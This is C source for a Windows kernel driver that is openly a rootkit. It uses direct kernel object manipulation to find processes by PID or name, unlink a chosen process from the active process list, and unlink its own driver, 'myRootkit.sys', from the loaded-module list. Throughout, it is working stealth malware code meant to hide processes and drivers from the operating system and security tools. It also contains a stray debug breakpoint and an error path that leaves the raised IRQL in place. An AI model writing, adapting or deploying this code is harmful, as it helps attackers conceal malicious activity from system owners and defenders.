
#include <ntddk.h>
#include "rootkit.h"
#include "rk_DKOM.h"
#include "rk_Tools.h"

extern NTOSKRNL_OFFSETS offsets;
extern PMODULE_ENTRY	g_PsLoadedModuleList;  

BOOLEAN OnProcessHide(IN ULONG pid) 
{
	PEPROCESS eproc = 0;
	KIRQL tmpIrql;

	DbgPrint("PID to hide: %d",pid);

	tmpIrql = RaiseIRQLevel();

	eproc = (PEPROCESS)FindProcessEPROCByPid( pid );

	DbgPrint( "EPROC: %x ",eproc);
	if (eproc == NULL ) {
		DbgPrint("Cant find process EPROC\n");	 
		return FALSE;
	}
	
	HideProcessFromProcessList( eproc );

	LowerIRQLevel( tmpIrql );

	return TRUE;
}


ULONG FindProcessEPROCByPid(int terminate_PID)
{
	ULONG eproc       = 0x00000000; 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	eproc = (ULONG) PsGetCurrentProcess();
	start_PID = *((ULONG*)(eproc+offsets.processPid));
	current_PID = start_PID;

	while(1)
	{
		if(terminate_PID == current_PID)
			return eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.activeProcessListOffset;
			current_PID = *((int *)(eproc+offsets.processPid));
			i_count++;
		}
	}
}

ULONG FindProcessEPROCByName(char procName[])
{
	ULONG eproc       = 0x00000000; 
	int	i_count     = 0;
	char *startName = 0;
	char *currentName = 0;
	PLIST_ENTRY plist_active_procs;

	if (procName == 0)
		return 0;

	_asm int 3

	eproc = (ULONG)PsGetCurrentProcess();
	startName = (PCHAR)(eproc+offsets.processName);
	currentName = startName;

	while(1)
	{

		if (!strncmp( procName, currentName, strlen(procName) ) ) 
			return eproc;
		else 
		if((i_count >= 1) && (startName == currentName))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
			eproc = (ULONG) plist_active_procs->Flink;
			eproc = eproc - offsets.activeProcessListOffset;
			currentName = (PCHAR)(eproc+offsets.processName);
			i_count++;
		}
	}
}

//unlink from ActiveProcessLinks list
BOOLEAN HideProcessFromProcessList( PEPROCESS eproc )
{
	PLIST_ENTRY plist_active_procs;
	plist_active_procs = (PLIST_ENTRY)((ULONG)eproc + offsets.activeProcessListOffset);

	*( (ULONG*)plist_active_procs->Blink )  = (ULONG)plist_active_procs->Flink;
	*( (ULONG*)plist_active_procs->Flink+1) = (ULONG)plist_active_procs->Blink;
	//poprawiamy zakonczenia pozostalego procesu
	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
	return TRUE;
}

BOOLEAN HideModule() 
{
	PMODULE_ENTRY pm_current;
	UNICODE_STRING driverToHide;
	KIRQL	tmpIrql;
	BOOLEAN	ret = FALSE;

//	tmpIrql = RaiseIRQLevel();

	RtlInitUnicodeString( &driverToHide, L"myRootkit.sys" );

	DbgPrint("DriverToHide: %S\n",driverToHide.Buffer);

	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);

	pm_current = g_PsLoadedModuleList;//->le_mod.Flink;

	while ((PMODULE_ENTRY)pm_current->le_mod.Flink != g_PsLoadedModuleList ) {
		if ( (pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length!=0)) {
			//porownujemy nazwy driverow
			if (RtlCompareUnicodeString(&driverToHide, &(pm_current->driver_Name),FALSE ) ==0 ) {
				//zminieniamy sasiadow
				*((PULONG)pm_current->le_mod.Blink) = (ULONG)pm_current->le_mod.Flink;
				pm_current->le_mod.Flink->Blink = pm_current->le_mod.Blink;
				ret = TRUE;
				goto gt_leave;
			}
		}
		pm_current = (PMODULE_ENTRY)pm_current->le_mod.Flink;
	}

gt_leave:
//	LowerIRQLevel( tmpIrql );

	return ret;
}

ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pm_current;

	if (DriverObject == NULL)
		return 0;

	pm_current = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
	if (pm_current == NULL)
		return 0;
	
	return (ULONG) pm_current;
}

PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName)
{
	PMODULE_ENTRY pMeCurrent = pPsLoadedModuleList;

	while ( (PMODULE_ENTRY)(pMeCurrent->le_mod.Flink) != pPsLoadedModuleList) {
		if ( (pMeCurrent->unk1 !=0x00000000) && pMeCurrent->driver_Path.Length!= 0) {
			if (RtlCompareUnicodeString(usModuleName, &(pMeCurrent->driver_Name),FALSE)== 0) {
				//znaleziono modul
				return pMeCurrent;
			}
		}
		pMeCurrent = (PMODULE_ENTRY)pMeCurrent->le_mod.Flink;
	}

	return NULL;
}
